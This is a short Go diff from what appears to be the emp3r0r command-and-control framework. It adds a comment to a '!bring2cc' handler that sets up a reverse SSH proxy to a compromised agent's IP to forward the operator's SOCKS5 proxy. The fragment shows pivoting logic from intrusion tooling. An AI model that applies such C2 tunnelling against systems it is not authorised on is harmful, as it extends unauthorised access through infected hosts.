@@ -55,6 +55,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !bring2cc --addr target_agent_ip
 	// Usage: !bring2cc --addr <target_agent_ip>
 	// Sets up a reverse proxy to the specified agent IP address.
+	// This will forward our SOCKS5 proxy to the target agent's identical port.
 	case emp3r0r_data.C2CmdBring2CC:
 		addr := flags.StringP("addr", "a", "", "Target agent IP address")
 		flags.Parse(cmdSlice[1:])
@@ -74,6 +75,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 				cancelfunc() // cancel existing connection
 			}
 		}
+
 		targetAddrWithPort := *addr + ":" + RuntimeConfig.ReverseProxyPort
 		ctx, cancel := context.WithCancel(context.Background())
 		if err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password,
